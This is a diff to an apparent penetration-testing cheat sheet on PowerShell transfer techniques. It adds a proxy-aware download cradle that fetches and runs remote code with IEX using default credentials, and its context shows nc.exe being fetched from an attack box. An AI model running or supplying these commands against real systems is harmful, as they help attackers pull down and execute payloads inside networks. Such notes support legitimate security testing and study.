@@ -260,7 +260,7 @@ Get-ExecutionPolicy
 Set-ExecutionPolicy Unrestricted
 ```
 
-#### Loading Script into Memory with powershell
+### Loading Script into Memory with powershell
 
 * The script can be loaded into memory with powershell&#x20;
 
@@ -297,6 +297,14 @@ powershell Invoke-WebRequest -Uri http://[ip attack box]/nc.exe -OutFile C:\nc.e
 ```
 powershell $PSVersionTable.PsVersion
 ```
+
+### Proxy Aware Powershell Downloader&#x20;
+
+```
+$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")
+```
+
+* **Description:** _'Most large orgs are using web proxies these days. The standard PowerShell download cradle is not proxy aware. Use this one.'_
 
 ### **Upload Windows data through HTTP Post request**
 
